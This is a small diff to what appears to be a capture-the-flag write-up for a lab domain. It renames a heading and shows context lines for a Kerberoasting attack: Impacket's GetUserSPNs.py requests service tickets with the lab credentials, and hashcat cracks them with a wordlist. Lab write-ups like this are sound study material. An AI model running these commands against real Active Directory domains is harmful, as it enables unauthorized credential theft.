@@ -439,7 +439,7 @@ klist
 python3 GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-ip 10.10.11.168 -dc-host dc1.scrm.local -k -request
 ```
 
-host
+host machine
 
 ```cmd
  .\hashcat.exe -m 13100 .\hash .\rockyou.txt
